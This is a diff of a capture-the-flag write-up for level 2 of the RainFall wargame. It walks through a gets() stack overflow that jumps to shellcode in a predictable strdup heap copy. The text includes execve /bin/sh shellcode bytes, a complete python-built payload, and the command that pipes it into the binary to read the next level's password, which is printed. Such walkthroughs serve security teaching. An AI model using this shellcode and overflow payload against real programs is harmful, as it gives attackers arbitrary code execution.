@@ -1,106 +1,91 @@
-# LEVEL 2
+## LEVEL 2
+---
 
-To start, I will take a look on our program by using GDB, Ghibra and ltrace.
-
-Let's see the decompilated program *(by using Ghibra)*.
-
-```c
-#include <stdlib.h>
-#include <unistd.h>
-#include <string.h>
-#include <stdio.h>
-
-char	buffer[76];
-
-void
-p (void) {
-	void	*ret_addr;
-
-	fflush(stdout);
-	gets(buffer);
-
-	ret_addr = __builtin_ret_addr(0);
-	if (((unsigned int)ret_addr & 0xb0000000) == 0xb0000000) {
-		printf("(%p)\n", ret_addr);
-		exit(1);
-	}
-	puts(buffer);
-	strdup(buffer);
-	return ;
-}
-
-int
-main (void) {
-	p();
-	return (0);
-}
-```
-
-Before start we can see that no function calls the ```system()``` or an ```execve()``` so we have to do a **ShellCode injection**. A shell code injection is technique that consists in changing a function return address or a function call by the address of our buffer which contains a executable code. Here our executable code is **ShellCode** that is an ASM code translated in bytecode who launch a shell terminal. We just need to know where inject it.
-
-Our program use ```gets()``` so we can try to use a **Buffer Overload Attack**, but the ```if``` condition checks if the p return address is on the heap and not on the stack. So our return address must be on the heap.
-
-We used GDB and Ghibra but not ltrace, let's use it.
+As usually, I start the level by using gdb and take a look on the functions we have.
 
 ```shell
-level2@RainFall:~$ ltrace ./level2
-__libc_start_main(0x804853f, 1, 0xbffff7a4, 0x8048550, 0x80485c0 <unfinished ...>
-fflush(0xb7fd1a20)                                              = 0
-gets(0xbffff6ac, 0, 0, 0xb7e5ec73, 0x80482b5AAAAAAAA
-)                   = 0xbffff6ac
-puts("AAAAAAAA"AAAAAAAA
-)                                                = 9
-strdup("AAAAAAAA")                                              = 0x0804a008
-+++ exited (status 8) +++
+(gdb) i func
+All defined functions:
+[...]
+0x080484d4  p
+0x0804853f  main
+[...]
 ```
 
-After many launched of ltrace, ```strdup()``` return address never changed, so we can understand that our function doesn't have ASLR *(Address Space Layout Randomization)* and the return address is on the head.
-
-So we will use the ```strdup()``` address to copy our shellcode, then we will change the return value of ```strdup()```, Like this the return address will point to our shellcode instead of ```main()```.
-
-### How to create a Payload ?
-
-#### Find a ShellCode.
-
-We can easily find a shellcode on internet with [this site](https://shell-storm.org/shellcode/)
-
-#### My shellcode :
-
-`\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80`
-
-#### Find EIP :
-
-We can easily find the EIP by using this [EIP Tools](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/)
+So we have two functions `p` and `main`, main is almost empty and it's only used to run `p`. So I will only talk about `p` during this level. Let's see what `p` does. I will only show the most interesting functions if you want to have the all function and the `main` function [click here](asm/level1.asm).
 
 ```shell
-level2@RainFall:~$ echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag" > /tmp/fill_buff
-level2@RainFall:~$ gdb -q level2
-Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
-(gdb) r < /tmp/fill_buff
-Starting program: /home/user/level2/level2 < /tmp/fill_buff
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
-
-Program received signal SIGSEGV, Segmentation fault.
-0x37634136 in ?? ()
+0x080484d7 <+3>:	sub    $0x68,%esp ; Allocate 104 bytes
+[...]
+0x080484ed <+25>:	call   0x80483c0 <gets@plt> ; Call gets and store in stack
+[...]
+0x080484f2 <+30>:	mov    0x4(%ebp),%eax ; Save the return address in eax register
+[...]
+0x080484fb <+39>:	and    $0xb0000000,%eax
+0x08048500 <+44>:	cmp    $0xb0000000,%eax ; Check if return value is in the stack
+0x08048505 <+49>:	jne    0x8048527 <p+83> ; Return if is in the stack
+[...]
+0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
+0x0804852a <+86>:	mov    %eax,(%esp)
+0x0804852d <+89>:	call   0x80483f0 <puts@plt> ; Print the buffer
+[...]
+0x08048535 <+97>:	mov    %eax,(%esp)
+0x08048538 <+100>:	call   0x80483e0 <strdup@plt> ; Copy the buffer
+0x0804853d <+105>:	leave
+0x0804853e <+106>:	ret
 ```
 
-#### Create the exploit
+First thing I notice is that we don't have any calls to `execve` or `system`. That means I have to run a shell by using a shellcode *(shell code is an ASM code translated into bytecode that launches a shell terminal)*.
 
-The exploit recipe is : `X * "\x90" + ShellCode(size = 21) + Y "\90" + "strdup() return address"` - `TOTAL SIZE = EIP SIZE = 80`
+The second thing is that we have a `gets` call to overflow the buffer and change the return address.
 
-### Payload
-
-`python -c 'print "\x90"*20 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*39 + "\x08\xa0\x04\x08"' > /tmp/payload`
-
-Now we can try to load the payload inside our program.
+Sadly, we have a problem.
 
 ```shell
-level2@RainFall:~$ (cat /tmp/payload; echo "cat /home/user/level3/.pass") | ./level2
-��������������������j
-                     X�Rh//shh/bin��1�̀����������������������������������
+(gdb) i proc mapping
+process 4836
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+[...]
+    0x804a000  0x806b000    0x21000        0x0 [heap]
+[...]
+    0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+```
+
+The condition at line 44 is here to check that our shellcode is inside the heap, but `gets` stores the input inside the stack. So when I change the return address to my shellcode inside the stack, the program will exit.
+
+To solve this problem, the virtual machine helps us! When I logged into the virtual machine, I saw this message: `System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)`. That means that the addresses where variables are stored on the stack and heap are the same every time you start the executable. That means that in our case, `strdup` will store a copy of our buffer always at the same address. So I will write a shellcode that overflows the buffer to overwrite the address of the copy of the shellcode in place of the return address. Our executable will jump to the shellcode at the end of the function without being blocked by the condition.
+
+It's time to create our payload !
+
+---
+
+First I search a shellcode, to do that I use [this](https://shell-storm.org/shellcode/index.html) website. Here is my shellcode :
+`\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80`.
+
+Then I need to find the return address of the `p` function.
+
+`EIP address = ($ebp + 4) - ($ebp - 4c) = 80`
+
+And finally the address return by `strcpy`.
+
+```shell
+(gdb) disas p
+[...]
+0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
+=> 0x0804853d <+105>:	leave
+[...]
+x $eax
+0x804a008:	0x61616161
+```
+
+Now here is my payload : `"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*59 + "\x08\xa0\x04\x08"'`
+
+```shell
+$ (python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*59 + "\x08\xa0\x04\x08"') > /tmp/payload
+$ (cat /tmp/payload; echo "cat /home/user/level3/.pass") | ./level2
+j
+ X�Rh//shh/bin��1�̀������������������������������������������������������
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 ```
-
-
-
-
